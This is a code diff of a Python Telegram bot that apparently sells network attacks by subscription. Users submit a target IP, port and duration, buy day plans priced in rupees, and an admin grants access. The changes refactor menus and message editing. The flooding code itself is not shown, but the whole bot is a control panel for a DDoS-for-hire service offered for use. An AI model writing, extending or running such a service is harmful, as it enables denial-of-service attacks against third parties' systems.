@@ -8,27 +8,29 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 
 MAIN_ADMIN = "5436530930"
-MAX_ATTACK_TIME = 300
-COOLDOWN_TIME = 1200
+MAX_ATTACK_TIME = 300     # 5 minutes
+COOLDOWN_TIME = 1200      # 20 minutes
 USERS_FILE = "users.json"
 
 PLANS = {1: 100, 3: 150, 7: 300}
 
 # ================= STATE =================
-running = {}
-cooldown = {}
-awaiting = set()
-admin_chat = set()
+running = {}        # uid -> end_time
+cooldown = {}       # uid -> last_end
+awaiting = set()    # uid waiting for params
+admin_chat = set()  # uid chatting with admin
 lock = threading.Lock()
 
 # ================= USERS =================
 def load_users():
     if not os.path.exists(USERS_FILE):
         return {}
-    return json.load(open(USERS_FILE))
+    with open(USERS_FILE, "r") as f:
+        return json.load(f)
 
 def save_users(d):
-    json.dump(d, open(USERS_FILE, "w"), indent=2)
+    with open(USERS_FILE, "w") as f:
+        json.dump(d, f, indent=2)
 
 users = load_users()
 
@@ -54,7 +56,7 @@ def remaining_days(uid):
     return max((datetime.fromisoformat(u["expires_at"]) - datetime.now()).days, 0)
 
 # ================= UI =================
-def user_menu(uid):
+def get_menu(uid):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(
         InlineKeyboardButton("🚀 Attack", callback_data="attack"),
@@ -62,21 +64,12 @@ def user_menu(uid):
         InlineKeyboardButton("👤 User Panel", callback_data="panel"),
         InlineKeyboardButton("💳 Plans", callback_data="plans"),
     )
-    if uid in running:
-        kb.add(InlineKeyboardButton("🛑 Stop Attack", callback_data="stop"))
-    return kb
-
-def admin_menu(uid):
-    kb = InlineKeyboardMarkup(row_width=2)
-    kb.add(
-        InlineKeyboardButton("🚀 Attack", callback_data="attack"),
-        InlineKeyboardButton("📞 Contact Admin", callback_data="contact"),
-        InlineKeyboardButton("👤 User Panel", callback_data="panel"),
-        InlineKeyboardButton("💳 Plans", callback_data="plans"),
-        InlineKeyboardButton("➕ Add User", callback_data="adduser"),
-        InlineKeyboardButton("➕ Add Admin", callback_data="addadmin"),
-        InlineKeyboardButton("➖ Remove User", callback_data="remove"),
-    )
+    if role(uid) == "main":
+        kb.add(
+            InlineKeyboardButton("➕ Add User", callback_data="adduser"),
+            InlineKeyboardButton("➕ Add Admin", callback_data="addadmin"),
+            InlineKeyboardButton("➖ Remove User", callback_data="remove"),
+        )
     if uid in running:
         kb.add(InlineKeyboardButton("🛑 Stop Attack", callback_data="stop"))
     return kb
@@ -86,57 +79,66 @@ def end_chat_kb():
     kb.add(InlineKeyboardButton("❌ End Admin Chat", callback_data="endchat"))
     return kb
 
-def get_menu(uid):
-    return admin_menu(uid) if role(uid) == "main" else user_menu(uid)
+# ================= HELPERS =================
+def edit(chat_id, message_id, text, kb=None):
+    bot.edit_message_text(
+        chat_id=chat_id,
+        message_id=message_id,
+        text=text,
+        reply_markup=kb
+    )
+
+# ================= START =================
+@bot.message_handler(commands=["start"])
+def start(m):
+    uid = str(m.chat.id)
+    text = (
+        "👑 <b>Main Admin Detected</b>\nFull control enabled."
+        if uid == MAIN_ADMIN
+        else "👋 <b>Welcome</b>\nChoose an option below"
+    )
+    bot.send_message(uid, text, reply_markup=get_menu(uid))
 
 # ================= CALLBACKS =================
 @bot.callback_query_handler(func=lambda c: True)
 def callbacks(c):
     uid = str(c.message.chat.id)
-    menu = get_menu(uid)
+    mid = c.message.message_id
 
     if c.data == "attack":
         if expired(uid):
             bot.answer_callback_query(c.id, "Plan expired. Contact admin.", show_alert=True)
             return
         awaiting.add(uid)
-        bot.send_message(
-            uid,
-            "📝 Enter attack details:\n<code>IP PORT SECONDS</code>\nExample:\n<code>1.1.1.1 80 120</code>"
-        )
-        bot.send_message(uid, " ", reply_markup=menu)
+        edit(uid, mid,
+             "📝 Enter:\n<code>IP PORT SECONDS</code>\nExample:\n<code>1.1.1.1 80 120</code>",
+             get_menu(uid))
 
     elif c.data == "contact":
         admin_chat.add(uid)
-        bot.send_message(uid, "💬 <b>Admin chat enabled</b>\nType your message.")
-        bot.send_message(uid, " ", reply_markup=end_chat_kb())
+        edit(uid, mid, "💬 <b>Admin chat enabled</b>\nType your message.", end_chat_kb())
 
     elif c.data == "endchat":
         admin_chat.discard(uid)
-        bot.send_message(uid, "✅ <b>Admin chat closed</b>")
-        bot.send_message(uid, " ", reply_markup=menu)
+        edit(uid, mid, "✅ <b>Admin chat closed</b>", get_menu(uid))
 
     elif c.data == "panel":
-        bot.send_message(
-            uid,
-            f"👤 <b>User Panel</b>\n\n"
-            f"Role: <b>{role(uid)}</b>\n"
-            f"Remaining Days: <b>{remaining_days(uid)}</b>"
+        edit(
+            uid, mid,
+            f"👤 <b>User Panel</b>\n\nRole: <b>{role(uid)}</b>\nRemaining Days: <b>{remaining_days(uid)}</b>",
+            get_menu(uid)
         )
-        bot.send_message(uid, " ", reply_markup=menu)
 
     elif c.data == "plans":
         txt = "💳 <b>Available Plans</b>\n\n"
         for d, p in PLANS.items():
             txt += f"{d} Day(s) – ₹{p}\n"
         txt += "\nContact admin to purchase."
-        bot.send_message(uid, txt)
-        bot.send_message(uid, " ", reply_markup=menu)
+        edit(uid, mid, txt, get_menu(uid))
 
     elif c.data == "stop":
         stop_attack(uid)
-        bot.send_message(uid, "🛑 <b>Attack stopped</b>\n⏳ Cooldown started (20 min)")
-        bot.send_message(uid, " ", reply_markup=menu)
+        edit(uid, mid, "🛑 <b>Attack stopped</b>\n⏳ Cooldown started (20 min)", get_menu(uid))
 
     elif c.data in ("adduser", "addadmin", "remove") and uid == MAIN_ADMIN:
         help_map = {
@@ -144,7 +146,7 @@ def callbacks(c):
             "addadmin": "/addadmin USERID DAYS",
             "remove": "/remove USERID"
         }
-        bot.send_message(uid, f"Usage:\n<code>{help_map[c.data]}</code>")
+        edit(uid, mid, f"Usage:\n<code>{help_map[c.data]}</code>", get_menu(uid))
 
 # ================= ADMIN CHAT =================
 @bot.message_handler(func=lambda m: str(m.chat.id) in admin_chat and str(m.chat.id) != MAIN_ADMIN)
@@ -197,8 +199,8 @@ def receive_attack(m):
     end_time = time.time() + sec
     running[uid] = end_time
 
-    bot.send_message(uid, f"✅ <b>Attack started</b>\nTarget: {ip}\nTime: {sec}s")
-    bot.send_message(uid, " ", reply_markup=get_menu(uid))
+    msg = bot.send_message(uid, f"✅ <b>Attack started</b>\nTarget: {ip}\nTime: {sec}s",
+                           reply_markup=get_menu(uid))
 
     def finish():
         while time.time() < end_time:
@@ -206,8 +208,9 @@ def receive_attack(m):
         if uid in running:
             running.pop(uid)
             cooldown[uid] = time.time()
-            bot.send_message(uid, "✅ <b>Attack completed</b>\n⏳ Cooldown: 20 minutes")
-            bot.send_message(uid, " ", reply_markup=get_menu(uid))
+            edit(uid, msg.message_id,
+                 "✅ <b>Attack completed</b>\n⏳ Cooldown: 20 minutes",
+                 get_menu(uid))
 
     threading.Thread(target=finish, daemon=True).start()
 
@@ -238,16 +241,6 @@ def remove_user(m):
         bot.reply_to(m, f"Removed {uid}")
     except:
         bot.reply_to(m, "Usage: /remove <id>")
-
-# ================= START =================
-@bot.message_handler(commands=["start"])
-def start(m):
-    uid = str(m.chat.id)
-    if uid == MAIN_ADMIN:
-        bot.send_message(uid, "👑 <b>Main Admin Detected</b>\nFull control enabled.")
-    else:
-        bot.send_message(uid, "👋 <b>Welcome</b>\nChoose an option below")
-    bot.send_message(uid, " ", reply_markup=get_menu(uid))
 
 # ================= RUN =================
 while True:
